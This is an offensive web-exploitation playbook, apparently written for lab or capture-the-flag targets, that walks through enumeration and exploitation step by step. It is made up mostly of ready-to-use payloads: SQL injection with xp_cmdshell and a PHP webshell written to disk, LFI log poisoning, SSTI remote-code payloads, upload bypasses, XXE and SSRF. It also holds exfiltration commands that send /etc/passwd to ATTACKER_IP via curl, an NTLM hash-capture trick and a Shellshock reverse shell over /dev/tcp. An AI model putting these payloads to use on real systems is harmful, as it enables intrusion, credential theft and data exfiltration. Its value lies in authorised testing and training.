---
tags: [web, http, no-creds, got-creds, foothold, sqli, lfi, ssti, rce, ssrf, xxe, upload, feroxbuster]
---

# Web Application Enumeration

> **Chains:** Creds found → spray [00_master_checklist.md Phase 4](./00_master_checklist.md) | Shell obtained → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md) | Internal service via SSRF → [03_service_enum.md](./03_service_enum.md) | AD login page → [06_active_directory.md](./06_active_directory.md)

---

## Step 1 — Tech Identification

```bash
# Always run before visiting
whatweb -a 3 http://$TARGET
whatweb -a 3 https://$TARGET

# Headers
curl -I http://$TARGET
curl -sI https://$TARGET | grep -iE "server|x-powered|content-type"

# Grab SSL cert hostnames
openssl s_client -connect $TARGET:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -i "dns:"
```

Check output for:
- Server version (Apache, nginx, IIS, WSGIServer)
- X-Powered-By (PHP version, ASP.NET)
- Cookies (PHPSESSID = PHP, ASP.NET_SessionId = .NET, JSESSIONID = Java)
- Any hostnames in cert → add to `/etc/hosts`

---

## Step 2 — Directory & File Busting

### feroxbuster (primary)

```bash
# Standard recursive scan
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,conf -t 40 --auto-tune -o recon/ferox.out

# ASP.NET target
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,ashx,config,bak -t 40 --auto-tune -o recon/ferox.out

# Java target
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x jsp,jspx,do,action,bak -t 40 --auto-tune -o recon/ferox.out

# Large wordlist (when medium misses things)
feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 40 --auto-tune -o recon/ferox_large.out

# Scan a specific subdirectory
feroxbuster -u http://$TARGET/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40 -o recon/ferox_api.out
```

### gobuster (fallback / when feroxbuster is too noisy)

```bash
# Standard
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip,conf,config,xml,json -t 40 -o recon/gobuster.out

# Large wordlist
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,txt,html -t 40 -o recon/gobuster_large.out
```

### ffuf (fallback / precise filtering)

```bash
# Recursive with size filtering
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$TARGET/FUZZ -e .php,.html,.txt,.bak,.zip,.conf -recursion -recursion-depth 3 -fs <baseline_size> -o recon/ffuf.json

# Filter by word count instead
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$TARGET/FUZZ -fw <baseline_words>
```

### Extensions cheatsheet

| App Type | Extensions to add |
|----------|-----------------|
| PHP app | `.php,.php5,.phtml,.bak,.php.bak` |
| ASP.NET | `.asp,.aspx,.ashx,.asmx,.config` |
| Java | `.jsp,.jspx,.do,.action` |
| Generic | `.txt,.html,.xml,.json,.zip,.tar.gz,.old,.bak,.conf` |

---

## Step 3 — Manual Checks

Always visit manually after scanning:

```bash
# Static files that always exist
/robots.txt
/sitemap.xml
/.git/          # git repo exposed
/.env           # credentials
/web.config     # IIS config
/.htaccess
/crossdomain.xml
/phpinfo.php
/info.php
/changelog.txt
/CHANGELOG
/readme.txt
/README.md
/backup.zip
/backup.tar.gz
```

---

## Step 4 — Virtual Host / Subdomain Fuzzing

```bash
# When IP redirects to hostname, fuzz for other vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://$TARGET -H "Host: FUZZ.$DOMAIN" \
  -fw <baseline_word_count>

# Gobuster vhost
gobuster vhost -u http://$TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Add found hostnames to /etc/hosts
echo "$TARGET_IP  found.domain.htb" | sudo tee -a /etc/hosts
```

---

## Step 5 — Input Testing

### SQLi — quick test
```
'
"
' OR 1=1-- -
" OR 1=1-- -
admin'--
' AND SLEEP(5)-- -
```

### SQLi — authentication bypass
```
admin'--
admin'#
') OR ('1'='1
' OR '1'='1'--
' OR 1=1 LIMIT 1--
' OR 1=1#
```

### SQLi — UNION-based (manual exploitation)

```sql
-- Step 1: find column count (increment until no error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error here → 2 columns

-- Step 2: find printable column (substitute 'a' for each NULL)
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- Step 3: extract data (MySQL / MSSQL / PostgreSQL)
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### SQLi — error-based (data leaks through error messages)

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
```

### SQLi — blind boolean-based

```sql
-- Confirm: true vs false gives different response
' AND 1=1--      -- normal response
' AND 1=2--      -- different/empty response

-- Extract data character by character (tedious — use sqlmap for this)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### SQLi — time-based blind (no visible difference between true/false)

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### SQLi — MSSQL: xp_cmdshell for RCE

```sql
-- Enable xp_cmdshell (if SA or sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Via stacked queries in injection point
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--

-- Read a file via OPENROWSET
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_BLOB) AS x--

-- Steal NetNTLM hash (trigger UNC path — combine with Responder)
EXEC xp_cmdshell 'net use \\ATTACKER_IP\share';
-- or:
'; EXEC xp_dirtree '\\ATTACKER_IP\share';--
```

### SQLi — MySQL: file read/write

```sql
-- Read files (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--

-- Write webshell (requires FILE privilege + writable web root)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

> **→** After writing shell: `http://$TARGET/shell.php?cmd=id` → replace `id` with reverse shell from [08_reverse_shells.md](./08_reverse_shells.md)

### SQLi — sqlmap

```bash
# Basic enumeration
sqlmap -u "http://$TARGET/page.php?id=1" --batch --dbs
sqlmap -u "http://$TARGET/page.php?id=1" --batch -D dbname -T users --dump

# POST parameter
sqlmap -u "http://$TARGET/login" --data "username=admin&password=test" --batch --dbs

# With session cookie
sqlmap -u "http://$TARGET/page.php?id=1" --cookie "PHPSESSID=abc123" --batch --dbs

# Pass a saved Burp request (most reliable for complex sessions)
sqlmap -r request.txt --batch --dbs

# Specify DB type (faster, more targeted)
sqlmap -r request.txt --dbms=mysql --batch
sqlmap -r request.txt --dbms=mssql --batch

# Specify technique (U=UNION B=Boolean T=Time E=Error S=Stacked)
sqlmap -r request.txt --technique=U --batch
sqlmap -r request.txt --technique=T --batch

# Increase aggressiveness when default fails
sqlmap -r request.txt --level=5 --risk=3 --batch

# WAF bypass tamper scripts
sqlmap -r request.txt --tamper=space2comment --batch   # spaces → /**/
sqlmap -r request.txt --tamper=randomcase --batch      # rAnDoM cAsE
sqlmap -r request.txt --tamper=between --batch         # AND → BETWEEN x AND y

# OS shell (MySQL INTO OUTFILE or MSSQL xp_cmdshell)
sqlmap -u "http://$TARGET/page.php?id=1" --batch --os-shell
```

> **→ OS shell obtained:** [08_reverse_shells.md](./08_reverse_shells.md) → upgrade shell → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md)

### LFI — quick test
```
?page=../../etc/passwd
?file=../../../../etc/passwd
?view=php://filter/convert.base64-encode/resource=index.php

# /proc/self/environ (inject PHP into User-Agent first, then include)
?file=../../../../proc/self/environ

# Null byte (PHP < 5.3.4 — terminates string, strips extension check)
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd%00.jpg

# Windows paths
?file=../../../../windows/system32/drivers/etc/hosts
?file=../../../../windows/win.ini
?file=C:\Windows\win.ini
?file=../../../../inetpub/wwwroot/web.config
```

```bash
# LFI parameter fuzzing
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "http://$TARGET/page.php?FUZZ=../../../../etc/passwd" -fs 0
```

### LFI → RCE escalation paths

```bash
# Log poisoning — inject PHP into Apache/Nginx log then include it
# 1. Confirm you can read the log:
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/nginx/access.log
?file=../../../../proc/self/fd/2     # stderr

# 2. Poison the log (send PHP in User-Agent):
curl -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/

# 3. Trigger it via LFI:
?file=../../../../var/log/apache2/access.log&cmd=id

# SSH log poisoning (port 22 open):
# Send malicious username during SSH auth:
ssh "<?php system(\$_GET['cmd']); ?>"@$TARGET
?file=../../../../var/log/auth.log&cmd=id

# PHP wrappers
?file=php://filter/convert.base64-encode/resource=index.php   # read source
?file=data://text/plain,<?php system('id'); ?>                 # RCE (allow_url_include on)
?file=expect://id                                              # RCE (expect module)
```

> **→ LFI → RCE confirmed:** [08_reverse_shells.md](./08_reverse_shells.md) → upgrade shell → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md)

### SSTI — quick test
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```
If output contains `49` → SSTI confirmed.

### SSTI — exploitation

```bash
# Identify engine first — the payload that returns 49 tells you which engine:
# {{7*7}} = 49          → Jinja2 (Python) or Twig (PHP)
# {{7*'7'}} = 7777777   → Jinja2
# ${7*7} = 49           → FreeMarker (Java) or Smarty (PHP)
# <%= 7*7 %> = 49       → ERB (Ruby)

# Jinja2 (Flask/Python) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby) — RCE
<%= `id` %>

# tplmap (automated — handles all engines)
tplmap -u "http://$TARGET/page?name=INJECT" --os-shell
```

> **→ SSTI → RCE confirmed:** [08_reverse_shells.md](./08_reverse_shells.md) → upgrade shell → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md)

### Command injection
```
; id
| id
&& id
`id`
$(id)
; ping -c 1 ATTACKER_IP
```

### Command injection — blind (no output in response)

```bash
# Time-based confirmation
; sleep 5
| sleep 5
&& sleep 5
$(sleep 5)

# Out-of-band confirmation (start listener first)
; curl http://ATTACKER_IP/$(id | base64)
; nslookup $(whoami).ATTACKER_IP
; ping -c 1 ATTACKER_IP

# Exfiltrate output via HTTP once confirmed
; curl "http://ATTACKER_IP/?o=$(cat /etc/passwd | base64 -w0)"

# Space/character filter bypasses
${IFS}             # replace space: cat${IFS}/etc/passwd
{cat,/etc/passwd}  # brace expansion, no space needed
$'\x20'            # space as hex escape
```

> **→ Confirmed:** replace `id` with reverse shell payload from [08_reverse_shells.md](./08_reverse_shells.md)

### File upload bypass
```
# Extension bypass
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.php5
shell.phtml
shell.shtml

# Magic bytes: add GIF header to PHP file
GIF89a;
<?php system($_GET['cmd']); ?>

# Content-Type bypass (change in Burp)
Content-Type: image/jpeg
```

> **→ Upload successful:** access the file and trigger execution → [08_reverse_shells.md](./08_reverse_shells.md) → upgrade → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md)

### XXE (XML External Entity)

Test any endpoint that accepts XML, or try switching JSON body to XML.

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Windows file read -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root>&xxe;</root>

<!-- SSRF via XXE (to detect / pivot) -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://ATTACKER_IP/">]>
<root>&xxe;</root>
```

Set Content-Type: `application/xml` if needed. Watch Burp/nc listener for callback on the SSRF variant.

> **→ File read via XXE:** check for SSH keys (`/root/.ssh/id_rsa`), web app configs, `/etc/shadow`
> **→ SSRF via XXE callback received:** continue in SSRF section below

### SSRF (Server-Side Request Forgery)

Look for any parameter that accepts a URL or hostname: `url=`, `path=`, `redirect=`, `dest=`, `src=`, `uri=`, `feed=`, `host=`, `image=`. Also check `X-Forwarded-For` and `Referer` headers.

```bash
# Step 1: Confirm SSRF — start a listener and inject your IP
nc -nvlp 80
# or: python3 -m http.server 80
# Inject: ?url=http://ATTACKER_IP/test

# Step 2: Probe internal services (once SSRF confirmed)
?url=http://127.0.0.1:PORT          # try common internal ports
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
?url=http://127.0.0.1:6379
?url=http://127.0.0.1:8080
?url=http://127.0.0.1:27017

# Step 3: Internal network sweep (if SSRF hits internal hosts)
?url=http://192.168.x.1/
?url=http://10.x.x.x/

# Filter bypasses
?url=http://0.0.0.0:80              # 0.0.0.0 often bypasses 127.0.0.1 blocks
?url=http://0x7f000001              # 127.0.0.1 in hex
?url=http://[::1]:80                # IPv6 localhost
?url=http://127.1/                  # shorthand
```

> **→ Internal service reachable via SSRF:** treat it like a local service — run commands from [03_service_enum.md](./03_service_enum.md) through the SSRF as a proxy
> **→ New internal network found:** [07_pivoting.md](./07_pivoting.md)

### Parameter Fuzzing (hidden/undiscovered parameters)

```bash
# Fuzz GET parameters on a known endpoint
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$TARGET/page.php?FUZZ=test" -fs <baseline_size>

# Fuzz POST parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$TARGET/login" -X POST \
  -d "FUZZ=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs <baseline_size>

# Fuzz POST body values (once parameter name is known)
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u "http://$TARGET/login" -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs <baseline_size>

# Fuzz JSON body
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$TARGET/api/v1/user" -X POST \
  -d '{"FUZZ":"test"}' \
  -H "Content-Type: application/json" \
  -fs <baseline_size>
```

---

## CMS Scanners

```bash
# WordPress
wpscan --url http://$TARGET --enumerate vp,vt,u,ap --plugins-detection aggressive
wpscan --url http://$TARGET -U users.txt -P /usr/share/wordlists/rockyou.txt  # brute login

# Drupal
droopescan scan drupal -u http://$TARGET
drupwn enum http://$TARGET

# Joomla
joomscan -u http://$TARGET

# Nikto (generic)
nikto -h http://$TARGET -o recon/nikto.out
```

---

## API Enumeration

```bash
# Find API endpoints
feroxbuster -u http://$TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -m GET,POST
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://$TARGET/api/FUZZ

# Test methods
curl -X OPTIONS http://$TARGET/api/v1/users -v
curl -X PUT http://$TARGET/api/v1/users/1 -d '{"admin":true}'

# Common paths
/api/v1/
/api/v2/
/swagger/
/swagger.json
/api-docs
/openapi.json
/graphql
```

---

## WebDAV

```bash
davtest -url http://$TARGET
cadaver http://$TARGET
```

---

## Shellshock (if cgi-bin found)

```bash
gobuster dir -u http://$TARGET/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x .sh,.cgi,.pl

# Test
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" http://$TARGET/cgi-bin/test.sh
```

---

## Credential Spraying on Web Logins

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form \
  "http://$TARGET/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# Default creds to try manually first
admin:admin
admin:password
admin:
admin:admin123
root:root
root:toor
guest:guest
test:test
```

> **→ Creds found:** also spray them across all other services — [00_master_checklist.md Phase 4](./00_master_checklist.md)
> **→ Admin panel access:** look for file upload, template editing, plugin install, backup download — each is a potential shell path
